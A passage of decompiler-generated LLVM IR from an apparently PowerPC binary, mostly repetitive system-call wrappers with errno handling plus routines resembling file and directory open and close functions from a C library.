  %v0_1000b3ec = phi i32 [ %v0_1000b3c0, %dec_label_pc_1000b3a8 ], [ -1, %dec_label_pc_1000b3d0 ]
  ret i32 %v0_1000b3ec

; uselistorder directives
  uselistorder label %dec_label_pc_1000b3dc, { 1, 0 }
}

define i32 @function_1000b3f0() local_unnamed_addr {
dec_label_pc_1000b3f0:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b408 = call i32 @__asm_mfcr()
  %v1_1000b40c = and i32 %v0_1000b408, 268435456
  %v3_1000b40c = icmp eq i32 %v1_1000b40c, 0
  store i32 %v0_1000b408, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b40c, label %dec_label_pc_1000b424, label %dec_label_pc_1000b418

dec_label_pc_1000b418:                            ; preds = %dec_label_pc_1000b3f0
  %v0_1000b418 = call i32 @function_1000bb0c()
  %v0_1000b41c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b41c = inttoptr i32 %v0_1000b418 to i32*
  store i32 %v0_1000b41c, i32* %v2_1000b41c, align 4
  br label %dec_label_pc_1000b424

dec_label_pc_1000b424:                            ; preds = %dec_label_pc_1000b3f0, %dec_label_pc_1000b418
  %v0_1000b434 = phi i32 [ %v0_1000b408, %dec_label_pc_1000b3f0 ], [ -1, %dec_label_pc_1000b418 ]
  ret i32 %v0_1000b434

; uselistorder directives
  uselistorder label %dec_label_pc_1000b424, { 1, 0 }
}

define i32 @function_1000b438() local_unnamed_addr {
dec_label_pc_1000b438:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b450 = call i32 @__asm_mfcr()
  %v1_1000b454 = and i32 %v0_1000b450, 268435456
  %v3_1000b454 = icmp eq i32 %v1_1000b454, 0
  store i32 %v0_1000b450, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b454, label %dec_label_pc_1000b46c, label %dec_label_pc_1000b460

dec_label_pc_1000b460:                            ; preds = %dec_label_pc_1000b438
  %v0_1000b460 = call i32 @function_1000bb0c()
  %v0_1000b464 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b464 = inttoptr i32 %v0_1000b460 to i32*
  store i32 %v0_1000b464, i32* %v2_1000b464, align 4
  br label %dec_label_pc_1000b46c

dec_label_pc_1000b46c:                            ; preds = %dec_label_pc_1000b438, %dec_label_pc_1000b460
  %v0_1000b47c = phi i32 [ %v0_1000b450, %dec_label_pc_1000b438 ], [ -1, %dec_label_pc_1000b460 ]
  ret i32 %v0_1000b47c

; uselistorder directives
  uselistorder label %dec_label_pc_1000b46c, { 1, 0 }
}

define i32 @function_1000b480() local_unnamed_addr {
dec_label_pc_1000b480:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b498 = call i32 @__asm_mfcr()
  %v1_1000b49c = and i32 %v0_1000b498, 268435456
  %v3_1000b49c = icmp eq i32 %v1_1000b49c, 0
  store i32 %v0_1000b498, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b49c, label %dec_label_pc_1000b4b4, label %dec_label_pc_1000b4a8

dec_label_pc_1000b4a8:                            ; preds = %dec_label_pc_1000b480
  %v0_1000b4a8 = call i32 @function_1000bb0c()
  %v0_1000b4ac = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b4ac = inttoptr i32 %v0_1000b4a8 to i32*
  store i32 %v0_1000b4ac, i32* %v2_1000b4ac, align 4
  br label %dec_label_pc_1000b4b4

dec_label_pc_1000b4b4:                            ; preds = %dec_label_pc_1000b480, %dec_label_pc_1000b4a8
  %v0_1000b4c4 = phi i32 [ %v0_1000b498, %dec_label_pc_1000b480 ], [ -1, %dec_label_pc_1000b4a8 ]
  ret i32 %v0_1000b4c4

; uselistorder directives
  uselistorder label %dec_label_pc_1000b4b4, { 1, 0 }
}

define i32 @function_1000b4c8() local_unnamed_addr {
dec_label_pc_1000b4c8:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b4e0 = call i32 @__asm_mfcr()
  %v1_1000b4e4 = and i32 %v0_1000b4e0, 268435456
  %v3_1000b4e4 = icmp eq i32 %v1_1000b4e4, 0
  store i32 %v0_1000b4e0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b4e4, label %dec_label_pc_1000b4fc, label %dec_label_pc_1000b4f0

dec_label_pc_1000b4f0:                            ; preds = %dec_label_pc_1000b4c8
  %v0_1000b4f0 = call i32 @function_1000bb0c()
  %v0_1000b4f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b4f4 = inttoptr i32 %v0_1000b4f0 to i32*
  store i32 %v0_1000b4f4, i32* %v2_1000b4f4, align 4
  br label %dec_label_pc_1000b4fc

dec_label_pc_1000b4fc:                            ; preds = %dec_label_pc_1000b4c8, %dec_label_pc_1000b4f0
  %v0_1000b50c = phi i32 [ %v0_1000b4e0, %dec_label_pc_1000b4c8 ], [ -1, %dec_label_pc_1000b4f0 ]
  ret i32 %v0_1000b50c

; uselistorder directives
  uselistorder label %dec_label_pc_1000b4fc, { 1, 0 }
}

define i32 @function_1000b510(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b510:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b528 = call i32 @__asm_mfcr()
  %v1_1000b52c = and i32 %v0_1000b528, 268435456
  %v3_1000b52c = icmp eq i32 %v1_1000b52c, 0
  store i32 %v0_1000b528, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b52c, label %dec_label_pc_1000b544, label %dec_label_pc_1000b538

dec_label_pc_1000b538:                            ; preds = %dec_label_pc_1000b510
  %v0_1000b538 = call i32 @function_1000bb0c()
  %v0_1000b53c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b53c = inttoptr i32 %v0_1000b538 to i32*
  store i32 %v0_1000b53c, i32* %v2_1000b53c, align 4
  br label %dec_label_pc_1000b544

dec_label_pc_1000b544:                            ; preds = %dec_label_pc_1000b510, %dec_label_pc_1000b538
  %v0_1000b554 = phi i32 [ %v0_1000b528, %dec_label_pc_1000b510 ], [ -1, %dec_label_pc_1000b538 ]
  ret i32 %v0_1000b554

; uselistorder directives
  uselistorder label %dec_label_pc_1000b544, { 1, 0 }
}

define i32 @function_1000b558(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b558:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000b56c = and i32 %arg2, 64
  %v3_1000b56c = icmp eq i32 %v1_1000b56c, 0
  br i1 %v3_1000b56c, label %dec_label_pc_1000b598, label %dec_label_pc_1000b57c

dec_label_pc_1000b57c:                            ; preds = %dec_label_pc_1000b558
  %v2_1000b584 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000b584, i32* %stack_var_-32, align 4
  %v0_1000b594 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000b598

dec_label_pc_1000b598:                            ; preds = %dec_label_pc_1000b558, %dec_label_pc_1000b57c
  %v0_1000b598 = phi i32 [ 0, %dec_label_pc_1000b558 ], [ %v0_1000b594, %dec_label_pc_1000b57c ]
  store i32 %v0_1000b598, i32* @r5, align 4
  %v0_1000b5a0 = call i32 @__asm_mfcr()
  %v1_1000b5a4 = and i32 %v0_1000b5a0, 268435456
  %v3_1000b5a4 = icmp eq i32 %v1_1000b5a4, 0
  store i32 %v0_1000b5a0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b5a4, label %dec_label_pc_1000b5bc, label %dec_label_pc_1000b5b0

dec_label_pc_1000b5b0:                            ; preds = %dec_label_pc_1000b598
  %v0_1000b5b0 = call i32 @function_1000bb0c()
  %v0_1000b5b4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b5b4 = inttoptr i32 %v0_1000b5b0 to i32*
  store i32 %v0_1000b5b4, i32* %v2_1000b5b4, align 4
  br label %dec_label_pc_1000b5bc

dec_label_pc_1000b5bc:                            ; preds = %dec_label_pc_1000b598, %dec_label_pc_1000b5b0
  %v0_1000b5cc = phi i32 [ %v0_1000b5a0, %dec_label_pc_1000b598 ], [ -1, %dec_label_pc_1000b5b0 ]
  ret i32 %v0_1000b5cc

; uselistorder directives
  uselistorder label %dec_label_pc_1000b5bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b598, { 1, 0 }
}

define i32 @function_1000b5d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b5d0:
  store i32 %arg1, i32* @r5, align 4
  %v2_1000b5dc = call i32 @function_1000b558(i32 577, i32 577)
  ret i32 %v2_1000b5dc
}

define i32 @function_1000b5e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b5e0:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b5f8 = call i32 @__asm_mfcr()
  %v1_1000b5fc = and i32 %v0_1000b5f8, 268435456
  %v3_1000b5fc = icmp eq i32 %v1_1000b5fc, 0
  store i32 %v0_1000b5f8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b5fc, label %dec_label_pc_1000b614, label %dec_label_pc_1000b608

dec_label_pc_1000b608:                            ; preds = %dec_label_pc_1000b5e0
  %v0_1000b608 = call i32 @function_1000bb0c()
  %v0_1000b60c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b60c = inttoptr i32 %v0_1000b608 to i32*
  store i32 %v0_1000b60c, i32* %v2_1000b60c, align 4
  br label %dec_label_pc_1000b614

dec_label_pc_1000b614:                            ; preds = %dec_label_pc_1000b5e0, %dec_label_pc_1000b608
  %v0_1000b624 = phi i32 [ %v0_1000b5f8, %dec_label_pc_1000b5e0 ], [ -1, %dec_label_pc_1000b608 ]
  ret i32 %v0_1000b624

; uselistorder directives
  uselistorder label %dec_label_pc_1000b614, { 1, 0 }
}

define i32 @function_1000b628(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b628:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b640 = call i32 @__asm_mfcr()
  %v1_1000b644 = and i32 %v0_1000b640, 268435456
  %v3_1000b644 = icmp eq i32 %v1_1000b644, 0
  store i32 %v0_1000b640, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b644, label %dec_label_pc_1000b65c, label %dec_label_pc_1000b650

dec_label_pc_1000b650:                            ; preds = %dec_label_pc_1000b628
  %v0_1000b650 = call i32 @function_1000bb0c()
  %v0_1000b654 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b654 = inttoptr i32 %v0_1000b650 to i32*
  store i32 %v0_1000b654, i32* %v2_1000b654, align 4
  br label %dec_label_pc_1000b65c

dec_label_pc_1000b65c:                            ; preds = %dec_label_pc_1000b628, %dec_label_pc_1000b650
  %v0_1000b66c = phi i32 [ %v0_1000b640, %dec_label_pc_1000b628 ], [ -1, %dec_label_pc_1000b650 ]
  ret i32 %v0_1000b66c

; uselistorder directives
  uselistorder label %dec_label_pc_1000b65c, { 1, 0 }
}

define i32 @function_1000b670(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b670:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b688 = call i32 @__asm_mfcr()
  %v1_1000b68c = and i32 %v0_1000b688, 268435456
  %v3_1000b68c = icmp eq i32 %v1_1000b68c, 0
  store i32 %v0_1000b688, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b68c, label %dec_label_pc_1000b6a4, label %dec_label_pc_1000b698

dec_label_pc_1000b698:                            ; preds = %dec_label_pc_1000b670
  %v0_1000b698 = call i32 @function_1000bb0c()
  %v0_1000b69c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b69c = inttoptr i32 %v0_1000b698 to i32*
  store i32 %v0_1000b69c, i32* %v2_1000b69c, align 4
  br label %dec_label_pc_1000b6a4

dec_label_pc_1000b6a4:                            ; preds = %dec_label_pc_1000b670, %dec_label_pc_1000b698
  %v0_1000b6b4 = phi i32 [ %v0_1000b688, %dec_label_pc_1000b670 ], [ -1, %dec_label_pc_1000b698 ]
  ret i32 %v0_1000b6b4

; uselistorder directives
  uselistorder label %dec_label_pc_1000b6a4, { 1, 0 }
}

define i32 @function_1000b6b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000b6b8:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b6d0 = call i32 @__asm_mfcr()
  %v1_1000b6d4 = and i32 %v0_1000b6d0, 268435456
  %v3_1000b6d4 = icmp eq i32 %v1_1000b6d4, 0
  store i32 %v0_1000b6d0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b6d4, label %dec_label_pc_1000b6ec, label %dec_label_pc_1000b6e0

dec_label_pc_1000b6e0:                            ; preds = %dec_label_pc_1000b6b8
  %v0_1000b6e0 = call i32 @function_1000bb0c()
  %v0_1000b6e4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b6e4 = inttoptr i32 %v0_1000b6e0 to i32*
  store i32 %v0_1000b6e4, i32* %v2_1000b6e4, align 4
  br label %dec_label_pc_1000b6ec

dec_label_pc_1000b6ec:                            ; preds = %dec_label_pc_1000b6b8, %dec_label_pc_1000b6e0
  %v0_1000b6fc = phi i32 [ %v0_1000b6d0, %dec_label_pc_1000b6b8 ], [ -1, %dec_label_pc_1000b6e0 ]
  ret i32 %v0_1000b6fc

; uselistorder directives
  uselistorder label %dec_label_pc_1000b6ec, { 1, 0 }
}

define i32 @function_1000b700(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b700:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b718 = call i32 @__asm_mfcr()
  %v1_1000b71c = and i32 %v0_1000b718, 268435456
  %v3_1000b71c = icmp eq i32 %v1_1000b71c, 0
  store i32 %v0_1000b718, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b71c, label %dec_label_pc_1000b734, label %dec_label_pc_1000b728

dec_label_pc_1000b728:                            ; preds = %dec_label_pc_1000b700
  %v0_1000b728 = call i32 @function_1000bb0c()
  %v0_1000b72c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b72c = inttoptr i32 %v0_1000b728 to i32*
  store i32 %v0_1000b72c, i32* %v2_1000b72c, align 4
  br label %dec_label_pc_1000b734

dec_label_pc_1000b734:                            ; preds = %dec_label_pc_1000b700, %dec_label_pc_1000b728
  %v0_1000b744 = phi i32 [ %v0_1000b718, %dec_label_pc_1000b700 ], [ -1, %dec_label_pc_1000b728 ]
  ret i32 %v0_1000b744

; uselistorder directives
  uselistorder label %dec_label_pc_1000b734, { 1, 0 }
}

define i32 @function_1000b748(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b748:
  %r31.global-to-local = alloca i32, align 4
  %v3_1000b748 = icmp eq i32 %arg2, 0
  br i1 %v3_1000b748, label %dec_label_pc_1000b788, label %dec_label_pc_1000b770

dec_label_pc_1000b770:                            ; preds = %dec_label_pc_1000b748
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_1000b788, label %dec_label_pc_1000b778

dec_label_pc_1000b778:                            ; preds = %dec_label_pc_1000b770
  %v0_1000b778 = call i32 @function_1000bb0c()
  %v2_1000b780 = inttoptr i32 %v0_1000b778 to i32*
  store i32 22, i32* %v2_1000b780, align 4
  %v0_1000b7ac.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b7a8

dec_label_pc_1000b788:                            ; preds = %dec_label_pc_1000b770, %dec_label_pc_1000b748
  %v0_1000b78c = call i32 @__asm_mfcr()
  %v1_1000b790 = and i32 %v0_1000b78c, 268435456
  %v3_1000b790 = icmp eq i32 %v1_1000b790, 0
  store i32 %v0_1000b78c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b790, label %dec_label_pc_1000b7a8, label %dec_label_pc_1000b79c

dec_label_pc_1000b79c:                            ; preds = %dec_label_pc_1000b788
  %v0_1000b79c = call i32 @function_1000bb0c()
  %v0_1000b7a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b7a0 = inttoptr i32 %v0_1000b79c to i32*
  store i32 %v0_1000b7a0, i32* %v2_1000b7a0, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b7a8

dec_label_pc_1000b7a8:                            ; preds = %dec_label_pc_1000b788, %dec_label_pc_1000b778, %dec_label_pc_1000b79c
  %v0_1000b7ac = phi i32 [ %v0_1000b78c, %dec_label_pc_1000b788 ], [ %v0_1000b7ac.pre, %dec_label_pc_1000b778 ], [ -1, %dec_label_pc_1000b79c ]
  ret i32 %v0_1000b7ac

; uselistorder directives
  uselistorder label %dec_label_pc_1000b7a8, { 2, 0, 1 }
}

define i32 @function_1000b7c0() local_unnamed_addr {
dec_label_pc_1000b7c0:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b7d8 = call i32 @__asm_mfcr()
  %v1_1000b7dc = and i32 %v0_1000b7d8, 268435456
  %v3_1000b7dc = icmp eq i32 %v1_1000b7dc, 0
  store i32 %v0_1000b7d8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b7dc, label %dec_label_pc_1000b7f4, label %dec_label_pc_1000b7e8

dec_label_pc_1000b7e8:                            ; preds = %dec_label_pc_1000b7c0
  %v0_1000b7e8 = call i32 @function_1000bb0c()
  %v0_1000b7ec = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b7ec = inttoptr i32 %v0_1000b7e8 to i32*
  store i32 %v0_1000b7ec, i32* %v2_1000b7ec, align 4
  br label %dec_label_pc_1000b7f4

dec_label_pc_1000b7f4:                            ; preds = %dec_label_pc_1000b7c0, %dec_label_pc_1000b7e8
  %v0_1000b804 = phi i32 [ %v0_1000b7d8, %dec_label_pc_1000b7c0 ], [ -1, %dec_label_pc_1000b7e8 ]
  ret i32 %v0_1000b804

; uselistorder directives
  uselistorder label %dec_label_pc_1000b7f4, { 1, 0 }
}

define i32 @function_1000b808(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b808:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b820 = call i32 @__asm_mfcr()
  %v1_1000b824 = and i32 %v0_1000b820, 268435456
  %v3_1000b824 = icmp eq i32 %v1_1000b824, 0
  store i32 %v0_1000b820, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b824, label %dec_label_pc_1000b83c, label %dec_label_pc_1000b830

dec_label_pc_1000b830:                            ; preds = %dec_label_pc_1000b808
  %v0_1000b830 = call i32 @function_1000bb0c()
  %v0_1000b834 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b834 = inttoptr i32 %v0_1000b830 to i32*
  store i32 %v0_1000b834, i32* %v2_1000b834, align 4
  br label %dec_label_pc_1000b83c

dec_label_pc_1000b83c:                            ; preds = %dec_label_pc_1000b808, %dec_label_pc_1000b830
  %v0_1000b84c = phi i32 [ %v0_1000b820, %dec_label_pc_1000b808 ], [ -1, %dec_label_pc_1000b830 ]
  ret i32 %v0_1000b84c

; uselistorder directives
  uselistorder label %dec_label_pc_1000b83c, { 1, 0 }
}

define i32 @function_1000b850(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b850:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b868 = call i32 @__asm_mfcr()
  %v1_1000b86c = and i32 %v0_1000b868, 268435456
  %v3_1000b86c = icmp eq i32 %v1_1000b86c, 0
  store i32 %v0_1000b868, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b86c, label %dec_label_pc_1000b884, label %dec_label_pc_1000b878

dec_label_pc_1000b878:                            ; preds = %dec_label_pc_1000b850
  %v0_1000b878 = call i32 @function_1000bb0c()
  %v0_1000b87c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b87c = inttoptr i32 %v0_1000b878 to i32*
  store i32 %v0_1000b87c, i32* %v2_1000b87c, align 4
  br label %dec_label_pc_1000b884

dec_label_pc_1000b884:                            ; preds = %dec_label_pc_1000b850, %dec_label_pc_1000b878
  %v0_1000b894 = phi i32 [ %v0_1000b868, %dec_label_pc_1000b850 ], [ -1, %dec_label_pc_1000b878 ]
  ret i32 %v0_1000b894

; uselistorder directives
  uselistorder label %dec_label_pc_1000b884, { 1, 0 }
}

define i32 @function_1000b898(i32* %arg1) local_unnamed_addr {
dec_label_pc_1000b898:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000b8b4 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1000b8bc = load i32, i32* %arg1, align 4
  store i32 %v2_1000b8b4, i32* @r3, align 4
  %v3_1000b8c8 = icmp eq i32 %v2_1000b8bc, -1
  br i1 %v3_1000b8c8, label %dec_label_pc_1000b8d0, label %dec_label_pc_1000b8e4

dec_label_pc_1000b8d0:                            ; preds = %dec_label_pc_1000b898
  %v0_1000b8d0 = call i32 @function_1000bb0c()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000b8dc = inttoptr i32 %v0_1000b8d0 to i32*
  store i32 9, i32* %v2_1000b8dc, align 4
  %v0_1000b928.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000b924

dec_label_pc_1000b8e4:                            ; preds = %dec_label_pc_1000b898
  %v3_1000b8e4 = call i32 @function_1000cf54(i32 %v2_1000b8b4, i32 ptrtoint ([3 x i8]* @global_var_1000cf4c.486 to i32))
  %v0_1000b8ec = call i32 @function_1000cf4c()
  %v0_1000b8f4 = load i32, i32* @r31, align 4
  %v1_1000b8f4 = inttoptr i32 %v0_1000b8f4 to i32*
  %v2_1000b8f4 = load i32, i32* %v1_1000b8f4, align 4
  store i32 %v2_1000b8f4, i32* @r29, align 4
  store i32 -1, i32* %v1_1000b8f4, align 4
  store i32 %v2_1000b8b4, i32* @r3, align 4
  %v2_1000b904 = call i32 @function_1000cf54(i32 %v2_1000b8b4, i32 1)
  %v0_1000b908 = load i32, i32* @r31, align 4
  %v1_1000b908 = add i32 %v0_1000b908, 12
  %v2_1000b908 = inttoptr i32 %v1_1000b908 to i32*
  %v3_1000b908 = load i32, i32* %v2_1000b908, align 4
  store i32 %v3_1000b908, i32* @r3, align 4
  store i32 268482832, i32* @lr, align 4
  %v0_1000b90c = call i32 @function_1000c5b8()
  %v0_1000b910 = load i32, i32* @r31, align 4
  store i32 %v0_1000b910, i32* @r3, align 4
  store i32 268482840, i32* @lr, align 4
  %v0_1000b914 = call i32 @function_1000c5b8()
  store i32 268482848, i32* @lr, align 4
  %v0_1000b91c = call i32 @function_1000b3f0()
  store i32 %v0_1000b91c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000b924

dec_label_pc_1000b924:                            ; preds = %dec_label_pc_1000b8d0, %dec_label_pc_1000b8e4
  %v0_1000b928 = phi i32 [ %v0_1000b928.pre, %dec_label_pc_1000b8d0 ], [ %v0_1000b91c, %dec_label_pc_1000b8e4 ]
  ret i32 %v0_1000b928

; uselistorder directives
  uselistorder i32 %v2_1000b8b4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000b924, { 1, 0 }
}

define i32 @function_1000b93c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b93c:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %v0_1000b93c = load i32, i32* @lr, align 4
  store i32 %v0_1000b93c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 268482908, i32* @lr, align 4
  %v2_1000b958 = call i32 @function_1000b558(i32 18432, i32 18432)
  %v1_1000b95c = icmp slt i32 %v2_1000b958, 0
  br i1 %v1_1000b95c, label %dec_label_pc_1000ba34, label %dec_label_pc_1000b964

dec_label_pc_1000b964:                            ; preds = %dec_label_pc_1000b93c
  %v2_1000b964 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000b964, i32* @r4, align 4
  store i32 268482924, i32* @lr, align 4
  %v1_1000b968 = call i32 @function_1000d328(i32 %v2_1000b964)
  %v1_1000b96c = icmp slt i32 %v1_1000b968, 0
  br i1 %v1_1000b96c, label %dec_label_pc_1000b990, label %dec_label_pc_1000b974

dec_label_pc_1000b974:                            ; preds = %dec_label_pc_1000b964
  %v0_1000b974 = load i32, i32* @r29, align 4
  store i32 2, i32* @r4, align 4
  store i32 268482952, i32* @lr, align 4
  %v2_1000b984 = call i32 @function_1000b2c0(i32 %v0_1000b974)
  %tmp5 = icmp sgt i32 %v2_1000b984, -1
  br i1 %tmp5, label %dec_label_pc_1000b9b0, label %dec_label_pc_1000b990

dec_label_pc_1000b990:                            ; preds = %dec_label_pc_1000b974, %dec_label_pc_1000b964
  %v0_1000b990 = call i32 @function_1000bb0c()
  store i32 0, i32* @r31, align 4
  store i32 %v0_1000b990, i32* @r28, align 4
  %v1_1000b9a0 = inttoptr i32 %v0_1000b990 to i32*
  %v2_1000b9a0 = load i32, i32* %v1_1000b9a0, align 4
  store i32 268482984, i32* @lr, align 4
  %v0_1000b9a4 = call i32 @function_1000b3f0()
  %v1_1000b9a8 = load i32, i32* @r28, align 4
  %v2_1000b9a8 = inttoptr i32 %v1_1000b9a8 to i32*
  store i32 %v2_1000b9a0, i32* %v2_1000b9a8, align 4
  br label %dec_label_pc_1000ba34

dec_label_pc_1000b9b0:                            ; preds = %dec_label_pc_1000b974
  store i32 48, i32* @r3, align 4
  store i32 268483000, i32* @lr, align 4
  %v0_1000b9b4 = call i32 @function_1000c3f0()
  store i32 %v0_1000b9b4, i32* %r31.global-to-local, align 4
  %v3_1000b9b8 = icmp eq i32 %v0_1000b9b4, 0
  br i1 %v3_1000b9b8, label %dec_label_pc_1000ba0c, label %dec_label_pc_1000b9c0

dec_label_pc_1000b9c0:                            ; preds = %dec_label_pc_1000b9b0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000b9c4 = load i32, i32* @r29, align 4
  %v2_1000b9c4 = inttoptr i32 %v0_1000b9b4 to i32*
  store i32 %v0_1000b9c4, i32* %v2_1000b9c4, align 4
  %v0_1000b9c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b9c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b9c8 = add i32 %v1_1000b9c8, 4
  %v3_1000b9c8 = inttoptr i32 %v2_1000b9c8 to i32*
  store i32 %v0_1000b9c8, i32* %v3_1000b9c8, align 4
  %v0_1000b9cc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b9cc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b9cc = add i32 %v1_1000b9cc, 16
  %v3_1000b9cc = inttoptr i32 %v2_1000b9cc to i32*
  store i32 %v0_1000b9cc, i32* %v3_1000b9cc, align 4
  %v0_1000b9d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b9d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b9d0 = add i32 %v1_1000b9d0, 8
  %v3_1000b9d0 = inttoptr i32 %v2_1000b9d0 to i32*
  store i32 %v0_1000b9d0, i32* %v3_1000b9d0, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_1000b9d8 = icmp ugt i32 %tmp, 511
  %v1_1000b9dc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b9dc = add i32 %v1_1000b9dc, 20
  %v3_1000b9dc = inttoptr i32 %v2_1000b9dc to i32*
  store i32 %tmp, i32* %v3_1000b9dc, align 4
  br i1 %v2_1000b9d8, label %dec_label_pc_1000b9ec, label %dec_label_pc_1000b9e4

dec_label_pc_1000b9e4:                            ; preds = %dec_label_pc_1000b9c0
  store i32 512, i32* %r0.global-to-local, align 4
  %v1_1000b9e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b9e8 = add i32 %v1_1000b9e8, 20
  %v3_1000b9e8 = inttoptr i32 %v2_1000b9e8 to i32*
  store i32 512, i32* %v3_1000b9e8, align 4
  br label %dec_label_pc_1000b9ec

dec_label_pc_1000b9ec:                            ; preds = %dec_label_pc_1000b9c0, %dec_label_pc_1000b9e4
  %v0_1000b9ec = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b9ec = add i32 %v0_1000b9ec, 20
  %v2_1000b9ec = inttoptr i32 %v1_1000b9ec to i32*
  %v3_1000b9ec = load i32, i32* %v2_1000b9ec, align 4
  store i32 268483064, i32* @lr, align 4
  %v2_1000b9f4 = call i32 @function_1000c548(i32 1, i32 %v3_1000b9ec)
  %v3_1000b9f8 = icmp eq i32 %v2_1000b9f4, 0
  %v1_1000b9fc = load i32, i32* @r31, align 4
  %v2_1000b9fc = add i32 %v1_1000b9fc, 12
  %v3_1000b9fc = inttoptr i32 %v2_1000b9fc to i32*
  store i32 %v2_1000b9f4, i32* %v3_1000b9fc, align 4
  br i1 %v3_1000b9f8, label %dec_label_pc_1000ba04, label %dec_label_pc_1000ba28

dec_label_pc_1000ba04:                            ; preds = %dec_label_pc_1000b9ec
  %v0_1000ba04 = load i32, i32* @r31, align 4
  store i32 %v0_1000ba04, i32* @r3, align 4
  store i32 268483084, i32* @lr, align 4
  %v0_1000ba08 = call i32 @function_1000c5b8()
  br label %dec_label_pc_1000ba0c

dec_label_pc_1000ba0c:                            ; preds = %dec_label_pc_1000b9b0, %dec_label_pc_1000ba04
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_1000ba18.489 to i32), i32* @lr, align 4
  %v0_1000ba14 = call i32 @function_1000b3f0()
  %v0_1000ba18 = call i32 @function_1000bb0c()
  store i32 12, i32* %r0.global-to-local, align 4
  %v2_1000ba20 = inttoptr i32 %v0_1000ba18 to i32*
  store i32 12, i32* %v2_1000ba20, align 4
  br label %dec_label_pc_1000ba34

dec_label_pc_1000ba28:                            ; preds = %dec_label_pc_1000b9ec
